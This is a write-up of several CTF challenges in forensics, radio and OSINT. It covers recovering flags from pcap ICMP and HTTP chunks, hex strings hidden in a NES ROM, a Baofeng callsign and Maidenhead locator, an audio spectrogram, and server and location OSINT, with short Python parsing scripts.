This challenge had an attached `pcap` file containing several packets with the sole purpose of adding noise to the transport of the flag.
After looking for a while at the various possible flows (HTTP, UDP, DNS, FTP), we noticed that the ICMP flows had inconsistencies compared to the others, since the data sent in the body of the requests had two formats:

* Hexadecimal data with a small payload at the end (about 2 bytes)
* Unclear ASCII strings

To find the flag, we therefore gathered the data into two separate strings and, in the first case, we removed the noise (null bytes), then tried to decode them on cyberchef.org.

Here we noticed that the ASCII string was actually the flag encoded in base64.

#### Python script

```python
#!/usr/bin/env python3
from base64 import b64decode
import pyshark, re

traffic = pyshark.FileCapture('unknown-traffic1.pcap')
full_data = ''
FLAGRE = r'ctf{[a-f0-9]+}'

for packet in traffic:
    if 'ICMP' not in packet:
        continue
    payload = bytes.fromhex(packet.icmp.data)
    if b'00' in payload:
        continue
    data = payload.decode()
    full_data += data

flag = b64decode(full_data).decode()
print(re.findall(FLAGRE, flag)[0])
```

### Unknown Traffic 2

This challenge came with a `pcap` file (`traffic.pcap`) containing mixed HTTP and ICMP packets, where the objective was to reconstruct a file split across multiple chunks.
By analyzing the traffic, we quickly noticed two distinct ways the payload fragments were embedded:

* In the HTTP requests, the query string carried base64 data in the form: `GET /data?chunk=N&data=...`
* In the ICMP packets, the payloads included ASCII markers such as: `CHUNK_N:...`

After extracting these sequences, we observed that each `chunk` index corresponded to a specific part of the file. Some chunks appeared multiple times with overlapping data; in those cases, the longest version was preserved.

The reconstruction process followed these steps:

1. Parse the pcap as text (`latin-1`) and match both encodings with regular expressions.
2. Collect the fragments and merge them according to their `chunk` index.
3. Concatenate all parts in ascending order into a single base64 string.
4. Decode the final base64 blob, adding padding when required.
5. Write the result to `decrypt.bin`.

The recovered file turned out to be a QR code PNG image (`680√ó680 RGBA`).

To simplify the extraction, we avoided heavy dependencies (e.g. `pyshark`) and instead used a minimal script with only `re` and `base64`. This script automatically scans the pcap, gathers both HTTP and ICMP chunks, merges them, and produces the final binary.

#### Python solution
```py
import re
from base64 import b64decode
from pathlib import Path

data = Path('traffic.pcap').read_bytes().decode('latin-1', errors='ignore')
http_pat = re.compile(r"GET /data\?chunk=(\d+)&data=([^\s]+)\s+HTTP/1.1")
icmp_pat = re.compile(r"CHUNK_(\d+):([A-Za-z0-9+/]+)")

chunks = {}
for m in http_pat.finditer(data):
    i, s = int(m.group(1)), m.group(2)
    chunks[i] = s if len(s) > len(chunks.get(i, '')) else chunks.get(i, '')
for m in icmp_pat.finditer(data):
    i, s = int(m.group(1)), m.group(2)
    chunks[i] = s if len(s) > len(chunks.get(i, '')) else chunks.get(i, '')

payload = ''.join(chunks[i] for i in sorted(chunks))
raw = b64decode(payload + '=' * (-len(payload) % 4))
Path('decrypt.bin').write_bytes(raw)
```

#### Note
In this script is not included how to scan a qr code since it can be done with any utility online/offline.

### Hidden in the Cartridge

This challenge shipped a NES ROM: `space_invaders.nes`. The flag was hidden directly in the cartridge data among otherwise normal-looking bytes.

After dumping printable strings (e.g., with `strings`, a hex editor, or a quick script), one pattern stood out: long runs of **two hex digits separated by `$$$`**, for example:

```
63$$$74$$$66$$$7b ... 30$$$7d
```

Two details made these sequences suspicious:

* They follow a strict form: `[0-9a-f]{2}` repeated, always separated by `$$$`.
* The very first decoded bytes line up with `63 74 66 7b` -> `c t f {`, and the final block ends with `7d` -> `}`.

To recover the flag, we collected all such `$$$`-separated hex blocks in order, split each on `$$$`, converted every two-digit hex chunk to a byte, decoded as text, and concatenated the results. The combined plaintext is the flag.

#### Python script

```python
#!/usr/bin/env python3
import re

data = open("space_invaders.nes", "rb").read()
text = data.decode("latin-1", errors="ignore")
pattern = re.compile(r'(?:[0-9a-fA-F]{2}(?:\$\$\$[0-9a-fA-F]{2})+)', re.MULTILINE)
matches = pattern.findall(text)
decoded = []
for m in matches:
    b = bytes(int(x, 16) for x in m.split("$$$"))
    decoded.append(b.decode("latin-1"))
print(''.join(decoded))
```

This prints the recovered `ctf{...}` token extracted from the ROM.

### Baofeng

This challenge required finding the `callsign` and the `name` of a city from a radio communication made with a Baofeng, attached as an mp3.

After listening to the communication a couple of times, we decided to look for a tool, or create a band-pass filter, to remove all the excess noise.
After doing this, even though we didn‚Äôt understand what was being said in the audio, we used an AI to convert **audio** -> **text**.

In this way, we obtained this text:

```
CQ, CQ, CQ, this is Yankee Oscar 2, Tango Sierra Sierra. My QTH is Kilo November 15, Kilo Sierra. CQ, CQ, CQ, this is Yankee Oscar 2, Tango Sierra Sierra.
```

Thanks to this transcription, we understood that the location (aka **`QTH`**) was `KN15KS`, which is the code of the city to find, while the callsign was "*Yankee Oscar 2, Tango Sierra Sierra*" which, transformed into NATO code, became **YO2TSS**, the first part of the flag.

To find the second part of the flag, it was enough to search the code `KN15KS` on a *Maidenhead grid* to find the city name, which was **`Hunedoara`**.

Putting it all together, the flag became `ctf{yo2tss_hunedoara}`.

### 3rd child

Short audio forensics task involving spectral text hidden in an audio channel.

#### Challenge description
> My 3rd child believes in ghosts. I don't know how to prove they aren't real.

‚ÄúGhosts‚Äù ‚Üí look for something you don't normally hear but can still be *seen* (spectrogram).

#### Provided file
`output.wav`

Analyzing `output.wav` in Audacity shows three distinct components: broadband noise, a music bed, and another track.
The challenge description suggests that we should visualize the spectrogram of the last layer.

## OSINT üåè

### Holiday Trip

This OSINT challenge required finding the location of the shop shown in the image.

After some research using Google Lens and ChatGPT, we were at a dead end. However, we noticed a cup in the top left corner of the image with **`Golden_Sands`** written on it. We decided to try it as the flag and we solved the challenge.

### Prison

This OSINT challenge required finding both the server host and the owner‚Äôs name of a Minecraft server. The only clue was an image showing several player nicknames and roles.

From the image, I noticed the owner‚Äôs username started with "Leaky_", and there were other players with roles like "srwarden", "warden", "guard", and "srguard". Some of the visible player names included PsychNOdelic, ButterInc, Cheese, and Dragon. The server itself had a prison-themed appearance.

To dig deeper, I used the deep research function of ChatGPT with this prompt:  
> Can you find a Minecraft server where the owner's name starts with Leaky_ and there are other players with roles like "srwarden", "warden", "guard", "srguard" and names PsychNOdelic, ButterInc, Cheese, Dragon? The server seems prison-based.

After some time, ChatGPT found a server called **play.thepen-mc.net**. On their Discord, I was able to confirm the owner‚Äôs full username: **Leaky_Tandos**.
